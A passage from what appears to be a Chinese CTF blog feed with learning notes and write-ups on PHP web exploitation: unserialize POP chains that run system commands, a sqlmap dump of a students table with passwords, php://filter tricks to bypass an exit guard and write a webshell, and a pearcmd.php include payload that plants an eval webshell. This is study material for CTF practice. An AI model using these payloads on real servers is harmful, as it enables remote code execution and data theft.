class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class NSS</span><br><span class="line">&#123;</span><br><span class="line">    public $cmd=&quot;cat /f*&quot;;</span><br><span class="line">    function __invoke()</span><br><span class="line">    &#123;</span><br><span class="line">        echo &quot;Congratulations!!!You have learned to construct a POP chain&lt;br/&gt;&quot;;</span><br><span class="line">        system($this-&gt;cmd);</span><br><span class="line">    &#125;</span><br><span class="line">    function __wakeup()</span><br><span class="line">    &#123;</span><br><span class="line">        echo &quot;W4keup!!!&lt;br/&gt;&quot;;</span><br><span class="line">        $this-&gt;cmd = &quot;echo Welcome to NSSCTF&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">class C</span><br><span class="line">&#123;</span><br><span class="line">    public $whoami;</span><br><span class="line">    function __get($argv)</span><br><span class="line">    &#123;</span><br><span class="line">        echo &quot;what do you want?&quot;;</span><br><span class="line">        $want = $this-&gt;whoami;</span><br><span class="line">        return $want();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">class T</span><br><span class="line">&#123;</span><br><span class="line">    public $sth;</span><br><span class="line">    function __toString()</span><br><span class="line">    &#123;</span><br><span class="line">        echo &quot;Now you know how to use __toString&lt;br/&gt;There is more than one way to trigger&quot;;</span><br><span class="line">        return $this-&gt;sth-&gt;var;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">class F</span><br><span class="line">&#123;</span><br><span class="line">    public $user = &quot;SWPU&quot;;</span><br><span class="line">    public $passwd = &quot;NSS&quot;;</span><br><span class="line">    public $notes;</span><br><span class="line">//    function __construct($user, $passwd)</span><br><span class="line">//    &#123;</span><br><span class="line">//        $this-&gt;user = $user;</span><br><span class="line">//        $this-&gt;passwd = $passwd;</span><br><span class="line">//    &#125;</span><br><span class="line">    function __destruct()</span><br><span class="line">    &#123;</span><br><span class="line">        if ($this-&gt;user === &quot;SWPU&quot; &amp;&amp; $this-&gt;passwd === &quot;NSS&quot;) &#123;</span><br><span class="line">            echo &quot;Now you know how to use __construct&lt;br/&gt;&quot;;</span><br><span class="line">            echo &quot;your notes&quot;.$this-&gt;notes;</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            die(&quot;N0!&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a=new F();</span><br><span class="line">$a-&gt;notes=new T();</span><br><span class="line">$a-&gt;notes-&gt;sth=new C();</span><br><span class="line">$a-&gt;notes-&gt;sth-&gt;whoami=new NSS();</span><br><span class="line">$b=serialize($a);</span><br><span class="line">echo $b;</span><br></pre></td></tr></table></figure><blockquote><p>O:1:”F”:3:{s:4:”user”;s:4:”SWPU”;s:6:”passwd”;s:3:”NSS”;s:5:”notes”;O:1:”T”:1:{s:3:”sth”;O:1:”C”:1:{s:6:”whoami”;O:3:”NSS”:1:{s:3:”cmd”;s:7:”cat &#x2F;f*”;}}}}</p></blockquote><p>base64编码传上去即可</p><p>python sqlmap.py -r 1.txt -D school -T students -C name,student_id,grade,password -dump -batch</p><p>在表格里可以看到flag</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> wp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 学习笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>File_put_contents利用技巧(php://filter协议）</title>
      <link href="/2023/10/19/file_put_contents%E5%88%A9%E7%94%A8%E6%8A%80%E5%B7%A7(phpfilter%E5%8D%8F%E8%AE%AE%EF%BC%89/"/>
      <url>/2023/10/19/file_put_contents%E5%88%A9%E7%94%A8%E6%8A%80%E5%B7%A7(phpfilter%E5%8D%8F%E8%AE%AE%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<h1 id="file-put-contents利用技巧-php-filter协议）"><a href="#file-put-contents利用技巧-php-filter协议）" class="headerlink" title="file_put_contents利用技巧(php:&#x2F;&#x2F;filter协议）"></a>file_put_contents利用技巧(php:&#x2F;&#x2F;filter协议）</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$content = &#x27;&lt;?php exit; ?&gt;&#x27;;</span><br><span class="line">$content .= $_POST[&#x27;txt&#x27;];</span><br><span class="line">file_put_contents($_POST[&#x27;filename&#x27;], $content);</span><br></pre></td></tr></table></figure><p><code>$content</code>在开头增加了exit过程，导致即使我们成功写入一句话，也执行不了。幸运的是，这里的<code>$_POST[&#39;filename&#39;]</code>是可以控制协议的，我们即可使用 php:&#x2F;&#x2F;filter协议来施展魔法。</p><p><strong>#方法一、base64编码</strong></p><p>使用php:&#x2F;&#x2F;filter流的base64-decode方法，将<code>$content</code>解码，利用php base64_decode函数特性去除“死亡exit”。</p><p>众所周知，base64编码中只包含64个可打印字符（A-Z a-z 0-9 + &#x2F;）’&#x3D;’补位，而PHP在解码base64时，遇到不在其中的字符时，将会跳过这些字符，仅将合法字符组成一个新的字符串进行解码。</p><p>所以，当<code>$content</code>被加上了<code>&lt;?php exit; ?&gt;</code>以后，我们可以使用 php:&#x2F;&#x2F;filter&#x2F;write&#x3D;convert.base64-decode  来首先对其解码。在解码的过程中，字符&lt;、?、;、&gt;、空格等一共有7个字符不符合base64编码的字符范围将被忽略，所以最终被解码的字符仅有“phpexit”和我们传入的其他字符。</p><p>“phpexit”一共7个字符，<strong>因为base64算法解码时是4个byte一组</strong>，所以给他增加1个“a”一共8个字符。这样，”phpexita”被正常解码，而后面我们传入的webshell的base64内容也被正常解码。结果就是<code>&lt;?php exit; ?&gt;</code>没有了。</p><p>最终效果：</p><p><a href="https://img2020.cnblogs.com/blog/1964477/202004/1964477-20200406235335043-1930261389.png"><img src="/2023/10/19/file_put_contents%E5%88%A9%E7%94%A8%E6%8A%80%E5%B7%A7(phpfilter%E5%8D%8F%E8%AE%AE%EF%BC%89/image/1964477-20200406235335043-1930261389-1700990340346-129-1700994531544-103.png"></a></p><p><strong>#方法二、利用字符串操作方法+base64组合拳</strong></p><p>除了使用base64特性的方法外，我们还可以利用php:&#x2F;&#x2F;filter字符串处理方法来去除“死亡exit”。我们观察一下，这个<code>&lt;?php exit; ?&gt;</code>实际上是什么？</p><p>实际上是一个XML标签，既然是XML标签，我们就可以利用strip_tags函数去除它，而php:&#x2F;&#x2F;filter刚好是支持这个方法的。</p><p>编写如下测试代码即可查看 php:&#x2F;&#x2F;filter&#x2F;read&#x3D;string.strip_tags&#x2F;resource&#x3D;php:&#x2F;&#x2F;input 的效果：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo readfile(&#x27;php://filter/read=string.strip_tags/resource=php://input&#x27;);</span><br></pre></td></tr></table></figure><p><a href="https://img2020.cnblogs.com/blog/1964477/202004/1964477-20200406234627327-1601681134.png"><img src="/2023/10/19/file_put_contents%E5%88%A9%E7%94%A8%E6%8A%80%E5%B7%A7(phpfilter%E5%8D%8F%E8%AE%AE%EF%BC%89/image/1964477-20200406234627327-1601681134-1700990340346-130-1700994531544-104.png"></a></p><p>可见，<code>&lt;?php exit; ?&gt;</code>被去除了。但回到上面的题目，我们最终的目的是写入一个webshell，而写入的webshell也是php代码，如果使用strip_tags同样会被去除。</p><p>万幸的是，php:&#x2F;&#x2F;filter允许使用多个过滤器，我们可以先将webshell用base64编码。在调用完成strip_tags后再进行base64-decode。“死亡exit”在第一步被去除，而webshell在第二步被还原。</p><p>最终效果：</p><p><a href="https://img2020.cnblogs.com/blog/1964477/202004/1964477-20200406234831984-1876664653.png"><img src="/2023/10/19/file_put_contents%E5%88%A9%E7%94%A8%E6%8A%80%E5%B7%A7(phpfilter%E5%8D%8F%E8%AE%AE%EF%BC%89/image/1964477-20200406234831984-1876664653-1700990340346-131-1700994531544-105.png"></a></p><p><strong>#方法三、ROT13编码</strong></p><p>原理和上面类似，核心是将“死亡exit”去除。<code>&lt;?php exit; ?&gt;</code>在经过rot13编码后会变成<code>&lt;?cuc rkvg; ?&gt;</code>，在PHP不开启short_open_tag时，php不认识这个字符串，当然也就不会执行了：</p><p><a href="https://img2020.cnblogs.com/blog/1964477/202004/1964477-20200407000202377-1581427195.png"><img src="/2023/10/19/file_put_contents%E5%88%A9%E7%94%A8%E6%8A%80%E5%B7%A7(phpfilter%E5%8D%8F%E8%AE%AE%EF%BC%89/image/1964477-20200407000202377-1581427195-1700990340346-132-1700994531544-106.png"></a></p><p> <strong>Round 2</strong> </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$a = $_POST[&#x27;txt&#x27;];</span><br><span class="line">file_put_contents($a,&quot;&lt;?php exit();&quot;.$a);</span><br></pre></td></tr></table></figure><p>这种是前后两个变量相同，假设$a可控情况。</p><p>这种相同变量的构造方式和不同变量的构造方式思路是大差不差的，都是需要干掉<code>&lt;?php exit();</code>，只不过构造起来相对更复杂一些。</p><p><strong>#方法一、base64编码</strong></p><p>根据前面介绍的不同变量的构造方法，很容易拓展到相同的变量，同样利用php:&#x2F;&#x2F;filter来构造，反正后面是写入的内容，只要在后面解码的时候把shell解码出来，不需要的东西解码成乱码即可，而Base64构造的话，例如</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$a=php://filter/write=convert.base64-decode|PD9waHAgcGhwaW5mbygpOz8+/resource=shell.php</span><br><span class="line"></span><br><span class="line">（    &lt;?php phpinfo();?&gt;    base64编码    PD9waHAgcGhwaW5mbygpOz8+      ）</span><br></pre></td></tr></table></figure><p>构造的shell可以放在过滤器的位置和文件名位置都可以（其他编码有时候会有空格什么的乱码，文件名不一定好用），php:&#x2F;&#x2F;filter面对不可用的规则（一串base64）是报个Warning，绕后跳过继续执行的（不会退出），所以按理说这样构造是“很完美”的。我们看下base-decode哪些字符👇</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php//filter/write=convertbase64decodePD9waHAgcGhwaW5mbygpOz8+/resource=shellphp</span><br></pre></td></tr></table></figure><p>而默认情况下base64编码是以 &#x3D; 作为结尾的，所以正常解码的时候到了 &#x3D; 就解码结束了，即使我们构造payload的时候不用<code>write=</code>，但是在最后获取文件名的时候<code>resource=</code>中的 &#x3D; 过不掉，所以导致过滤器解码失败，从而报错…</p><p>这里用base64编码我还没找到好的方法，待补充…</p><p><strong>#方法二、ROT13</strong></p><p>rot13编码就不存在base64的问题，所以和前面base64构造的思路一样</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$a = php://filter/write=string.rot13|&lt;?cuc cucvasb();?&gt;/resource=shell.php</span><br></pre></td></tr></table></figure><p><a href="https://img2020.cnblogs.com/blog/1964477/202004/1964477-20200407103428847-745843372.png"><img src="/2023/10/19/file_put_contents%E5%88%A9%E7%94%A8%E6%8A%80%E5%B7%A7(phpfilter%E5%8D%8F%E8%AE%AE%EF%BC%89/image/1964477-20200407103428847-745843372-1700990340346-133-1700994531544-107.png"></a><a href="https://img2020.cnblogs.com/blog/1964477/202004/1964477-20200407103501626-1447360416.png"><img src="/2023/10/19/file_put_contents%E5%88%A9%E7%94%A8%E6%8A%80%E5%B7%A7(phpfilter%E5%8D%8F%E8%AE%AE%EF%BC%89/image/1964477-20200407103501626-1447360416-1700990340346-134-1700994531544-108.png"></a></p><p> 和前面提到的一样，这种方法是需要服务器没有开启短标签的时候才可以使用（默认情况是没开启的：php.ini中的short_open_tag）</p><p><strong>#方法三、iconv字符编码转换</strong></p><p>通过字符转换把<code>&lt;?php exit();</code>转成不能解析的，这里采用的是UCS-2或者UCS-4编码方式，而我们构造的转成可正常解析的</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#echo iconv(&quot;UCS-2LE&quot;,&quot;UCS-2BE&quot;,&#x27;&lt;?php phpinfo();?&gt;&#x27;);</span><br><span class="line">?&lt;hp phpipfn(o;)&gt;?</span><br></pre></td></tr></table></figure><p>这里用的是UCS-2，当然我们也可以用UCS-4</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">echo iconv(&quot;UCS-4LE&quot;,&quot;UCS-4BE&quot;,&#x27;aa&lt;?php phpinfo();?&gt;&#x27;);</span><br><span class="line">?&lt;aa phpiphp(ofn&gt;?;)</span><br></pre></td></tr></table></figure><p>通过UCS-2或者UCS-4的方式，对目标字符串进行2&#x2F;4位一反转，也就是说构造的需要是UCS-2或UCS-4中2或者4的倍数，不然不能进行反转，那我们就可以利用这种过滤器进行编码转换绕过了，构造payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$a=&#x27;php://filter/convert.iconv.UCS-2LE.UCS-2BE|?&lt;hp phpipfn(o;)&gt;?/resource=shell.php&#x27;;</span><br><span class="line"></span><br><span class="line">**or**</span><br><span class="line"></span><br><span class="line">$a=&#x27;php://filter/convert.iconv.UCS-4LE.UCS-4BE|xxx?&lt;aa phpiphp(ofn&gt;?;)/resource=shell.php&#x27;;</span><br><span class="line">#由于是4位一反转，所以需要保证?&lt;aa phpiphp(ofn&gt;?;)之前字符个数是4的倍数,所以补充了 xxx</span><br></pre></td></tr></table></figure><p> <a href="https://img2020.cnblogs.com/blog/1964477/202004/1964477-20200407105517997-451500709.png"><img src="/2023/10/19/file_put_contents%E5%88%A9%E7%94%A8%E6%8A%80%E5%B7%A7(phpfilter%E5%8D%8F%E8%AE%AE%EF%BC%89/image/1964477-20200407105517997-451500709-1700990340346-135-1700994531544-109.png"></a></p><p><strong>#方法四、iconv字符编码转换+ROT13编码组合拳</strong></p><p>和前后不同的变量的利用一样，相同变量一样可以使用组合拳，原因前面描述过了，就不赘述，这里就用UCS-2和rot13举一个例子吧</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$a = &#x27;php://filter/write=convert.iconv.UCS-2LE.UCS-2BE|string.rot13|x?&lt;uc cucvcsa(b;)&gt;?/resource=shell.php&#x27;</span><br><span class="line">#先将 &lt;?php phpinfo(); ?&gt; 进行rot13得到&lt;?cuc cucvasb();?&gt;</span><br><span class="line">#再对&lt;?cuc cucvasb();?&gt;进行UCS2编码转换得到?&lt;uc cucvcsa(b;)&gt;?</span><br><span class="line">#最后x 补位</span><br><span class="line">#最终得到x?&lt;uc cucvcsa(b;)&gt;?</span><br></pre></td></tr></table></figure><p><a href="https://img2020.cnblogs.com/blog/1964477/202004/1964477-20200407111602416-1849632067.png"><img src="/2023/10/19/file_put_contents%E5%88%A9%E7%94%A8%E6%8A%80%E5%B7%A7(phpfilter%E5%8D%8F%E8%AE%AE%EF%BC%89/image/1964477-20200407111602416-1849632067-1700990340346-136-1700994531544-110.png"></a></p><p> 为何不用string.strip_tags呢？因为rot13转换的同样会被strip_tags方法给删除了，而UCS-2或UCS-4构造的也同样会被strip_tags方法给删除，这里需要找其他的编码方式进行构造。</p><p>参考：</p><p><a href="https://www.leavesongs.com/PENETRATION/php-filter-magic.html">https://www.leavesongs.com/PENETRATION/php-filter-magic.html</a></p><p><a href="https://mp.weixin.qq.com/s/BXBe0sviIpjzQb49fk1TCg">https://mp.weixin.qq.com/s/BXBe0sviIpjzQb49fk1TCg</a></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> 笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 学习笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>香山杯</title>
      <link href="/2023/10/18/%E9%A6%99%E5%B1%B1%E6%9D%AF/"/>
      <url>/2023/10/18/%E9%A6%99%E5%B1%B1%E6%9D%AF/</url>
      
        <content type="html"><![CDATA[<h1 id="香山杯"><a href="#香山杯" class="headerlink" title="香山杯"></a>香山杯</h1><h2 id="PHP-unserialize-pro"><a href="#PHP-unserialize-pro" class="headerlink" title="PHP_unserialize_pro"></a>PHP_unserialize_pro</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class Welcome</span><br><span class="line">&#123;</span><br><span class="line">    public $name=&#x27;A_G00d_H4ck3r&#x27;;</span><br><span class="line">    public $arg = &#x27;welcome&#x27;;</span><br><span class="line"></span><br><span class="line">//    public function __construct()</span><br><span class="line">//    &#123;</span><br><span class="line">//        $this-&gt;name = &#x27;Wh0 4m I?&#x27;;</span><br><span class="line">//    &#125;</span><br><span class="line"></span><br><span class="line">​    public function __destruct()</span><br><span class="line">​    &#123;</span><br><span class="line">​        if ($this-&gt;name == &#x27;A_G00d_H4ck3r&#x27;) &#123;</span><br><span class="line">​            echo &quot;1&quot;.$this-&gt;arg=&#x27;1&#x27;;</span><br><span class="line">​        &#125;</span><br><span class="line">​    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class G00d&#123;</span><br><span class="line">    public $shell;</span><br><span class="line">    public $cmd;</span><br><span class="line">    public function __invoke()&#123;</span><br><span class="line">        $shell = $this-&gt;shell;</span><br><span class="line">        $cmd = $this-&gt;cmd;</span><br><span class="line">        if(preg_match(&#x27;/f|l|a|g|\*|\?/i&#x27;, $cmd))&#123;</span><br><span class="line">            die(&quot;U R A BAD GUY&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">        eval($shell($cmd));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class H4ck3r</span><br><span class="line">&#123;</span><br><span class="line">    public $func;</span><br><span class="line"></span><br><span class="line">​    public function __toString()</span><br><span class="line">​    &#123;</span><br><span class="line">​        $function = $this-&gt;func;</span><br><span class="line">​        return $function();</span><br><span class="line">​    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$a=new Welcome();</span><br><span class="line">$a-&gt;name=new H4ck3r();</span><br><span class="line">$a-&gt;name-&gt;func=new G00d();</span><br><span class="line">$a-&gt;name-&gt;func-&gt;shell=&#x27;strtolower&#x27;;</span><br><span class="line">$a-&gt;name-&gt;func-&gt;cmd=&#x27;show_source(chr(47).chr(102).chr(49).chr(97).chr(103));&#x27;;</span><br><span class="line">echo serialize($a);</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> wp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Pear命令读文件</title>
      <link href="/2023/10/18/Pear%E5%91%BD%E4%BB%A4%E8%AF%BB%E6%96%87%E4%BB%B6/"/>
      <url>/2023/10/18/Pear%E5%91%BD%E4%BB%A4%E8%AF%BB%E6%96%87%E4%BB%B6/</url>
      
        <content type="html"><![CDATA[<h1 id="Pear命令读文件"><a href="#Pear命令读文件" class="headerlink" title="Pear命令读文件"></a>Pear命令读文件</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line">    <span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>])) &#123;</span><br><span class="line">        <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/flag|log|session|filter|input|data/i&#x27;</span>, <span class="variable">$file</span>)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;hacker!&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">include</span>(<span class="variable">$file</span>.<span class="string">&quot;.php&quot;</span>);</span><br><span class="line">        <span class="comment"># Something in phpinfo.php!</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><p><img src="/2023/10/18/Pear%E5%91%BD%E4%BB%A4%E8%AF%BB%E6%96%87%E4%BB%B6/image/image-20231017185626227-1700990443387-225.png"></p><blockquote><p> payload:+config-create+&#x2F;&amp;file&#x3D;&#x2F;usr&#x2F;local&#x2F;lib&#x2F;php&#x2F;pearcmd&amp;&#x2F;<?=eval($_POST[1])?>+&#x2F;var&#x2F;www&#x2F;html&#x2F;a.php </p></blockquote><pre><code>不同的系统pearcmd存放的位置好像不一定， 有的在/usr/share/php/pearcmd.php。关于payload的解释： config-create是pearcmd.php的参数，用于创建默认配置文件。这个命令需要两个参数，根路径和文件名。所以payload是利用该参数将&lt;?php eval($_POST[1])?&gt;写入到/var/www/html/a.php文件中。</code></pre><h1 id="registerargcargv与include-to-RCE的巧妙组合-https-longlone-top-安全-安全研究-register-argc-argv与include-to-RCE的巧妙组合-registerargcargv与include-to-rce的巧妙组合"><a href="#registerargcargv与include-to-RCE的巧妙组合-https-longlone-top-安全-安全研究-register-argc-argv与include-to-RCE的巧妙组合-registerargcargv与include-to-rce的巧妙组合" class="headerlink" title="registerargcargv与include to RCE的巧妙组合[#](https://longlone.top/安全/安全研究/register_argc_argv与include to RCE的巧妙组合&#x2F;#registerargcargv与include-to-rce的巧妙组合)"></a>register<em>argc</em>argv与include to RCE的巧妙组合[#](<a href="https://longlone.top/%E5%AE%89%E5%85%A8/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/register_argc_argv%E4%B8%8Einclude">https://longlone.top/安全/安全研究/register_argc_argv与include</a> to RCE的巧妙组合&#x2F;#registerargcargv与include-to-rce的巧妙组合)</h1><p>引子是巅峰极客2020的<strong>Meow World</strong>,题目总结下来只有一句话:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">include $_GET[&#x27;f&#x27;].&quot;.php&quot;;</span><br></pre></td></tr></table></figure><p>真的是开局一个include,getshell全靠猜,比赛时提示register<em>argc</em>argv,但没做出来,赛后看了别人的wp和总结,自己也打算写一个小结.</p><h2 id="registerargcargv-https-longlone-top-安全-安全研究-register-argc-argv与include-to-RCE的巧妙组合-registerargcargv"><a href="#registerargcargv-https-longlone-top-安全-安全研究-register-argc-argv与include-to-RCE的巧妙组合-registerargcargv" class="headerlink" title="registerargcargv[#](https://longlone.top/安全/安全研究/register_argc_argv与include to RCE的巧妙组合&#x2F;#registerargcargv)"></a>register<em>argc</em>argv[#](<a href="https://longlone.top/%E5%AE%89%E5%85%A8/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/register_argc_argv%E4%B8%8Einclude">https://longlone.top/安全/安全研究/register_argc_argv与include</a> to RCE的巧妙组合&#x2F;#registerargcargv)</h2><p>首先了解到这个参数默认是On的:</p><img src="/2023/10/18/Pear%E5%91%BD%E4%BB%A4%E8%AF%BB%E6%96%87%E4%BB%B6/image/20210605082433-1700990443387-226.png" style="zoom:75%;"><p>但是经过后来测试发现但凡配置了php.ini的php里都会显示声明该参数为Off,那么这个参数是用来做什么的呢?</p><p><img src="/2023/10/18/Pear%E5%91%BD%E4%BB%A4%E8%AF%BB%E6%96%87%E4%BB%B6/image/20210605082507-1700990443387-227.png"></p><p><img src="/2023/10/18/Pear%E5%91%BD%E4%BB%A4%E8%AF%BB%E6%96%87%E4%BB%B6/image/20210605082516-1700990443387-228.png"></p><p>这里介绍了register<em>argc</em>argv的作用,当这个参数开启的时候,php会注册argc和argv这个全局变量,并且通过第二个图可知我们可以从$_SERVER[‘argv’] 中获取到这些值.</p><p>这里就要知道php作为一种脚本语言,当然可以用于编写命令行脚本,而我们可以在脚本中直接访问 argv ,argc 这两个全局变量.</p><p>这里实际测试下载register<em>argc</em>argv开启的情况下_SERVER[‘argv’]与argv的值:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">var_dump($_SERVER[&#x27;argv&#x27;]);</span><br><span class="line">var_Dump($argv);</span><br></pre></td></tr></table></figure><p>网页端中:</p><p><img src="/2023/10/18/Pear%E5%91%BD%E4%BB%A4%E8%AF%BB%E6%96%87%E4%BB%B6/image/20210605082551-1700990443387-229.png"></p><p>命令行模式下:</p><p><img src="/2023/10/18/Pear%E5%91%BD%E4%BB%A4%E8%AF%BB%E6%96%87%E4%BB%B6/image/20210605082610-1700990443387-233.png"></p><p>而在register<em>argc</em>argv关闭的情况下,$_SERVER[‘argv’]不会拿到任何取值</p><h2 id="pear-https-longlone-top-安全-安全研究-register-argc-argv与include-to-RCE的巧妙组合-pear"><a href="#pear-https-longlone-top-安全-安全研究-register-argc-argv与include-to-RCE的巧妙组合-pear" class="headerlink" title="pear[#](https://longlone.top/安全/安全研究/register_argc_argv与include to RCE的巧妙组合&#x2F;#pear)"></a>pear[#](<a href="https://longlone.top/%E5%AE%89%E5%85%A8/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/register_argc_argv%E4%B8%8Einclude">https://longlone.top/安全/安全研究/register_argc_argv与include</a> to RCE的巧妙组合&#x2F;#pear)</h2><p>接下来就要介绍pear这个命令,简介如下:</p><h3 id="pear-https-longlone-top-安全-安全研究-register-argc-argv与include-to-RCE的巧妙组合-pear-1"><a href="#pear-https-longlone-top-安全-安全研究-register-argc-argv与include-to-RCE的巧妙组合-pear-1" class="headerlink" title="pear[#](https://longlone.top/安全/安全研究/register_argc_argv与include to RCE的巧妙组合&#x2F;#pear_1)"></a>pear[#](<a href="https://longlone.top/%E5%AE%89%E5%85%A8/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/register_argc_argv%E4%B8%8Einclude">https://longlone.top/安全/安全研究/register_argc_argv与include</a> to RCE的巧妙组合&#x2F;#pear_1)</h3><p>Pear 是 PHP 扩展与应用库（the PHP Extension and Application Repository）的缩写，是一个 PHP 扩展及应用的一个代码仓库。Pear 仓库代码是以包（package）分区，每一个 <code>Pear package</code> 都是一个独立的项目有着自己独立的开发团队、版本控制、文档和其他包的依赖关系信息。Pear package 以 phar、tar 或 zip 发布。</p><p>既然是个包管理器,那么就应该存在下载和安装包的功能,那么pear命令是如何实现的呢?</p><p>实际上pear命令是sh脚本,源码如下:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span 